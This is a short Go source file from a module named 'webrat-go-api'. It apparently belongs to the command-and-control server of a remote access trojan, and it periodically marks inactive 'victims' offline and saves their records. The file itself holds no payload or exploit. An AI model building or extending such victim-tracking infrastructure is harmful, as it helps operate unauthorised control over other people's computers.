package ws

import (
	"time"

	"webrat-go-api/internal/storage"
)

func (h *Hub) startCleanup() {
	go func() {
		t := time.NewTicker(2 * time.Minute)
		defer t.Stop()

		for range t.C {
			cutoff := time.Now().Add(-5 * time.Minute)
			var toOffline []*storage.Victim

			h.mu.Lock()
			for _, v := range h.victims {
				if v != nil && v.Online && !v.LastActive.IsZero() && v.LastActive.Before(cutoff) {
					v.Online = false
					vv := *v
					toOffline = append(toOffline, &vv)
				}
			}
			h.mu.Unlock()

			h.broadcastVictims()

			for _, v := range toOffline {
				if h.db != nil {
					_ = h.db.UpsertVictim(v)
				}
			}
		}
	}()
}
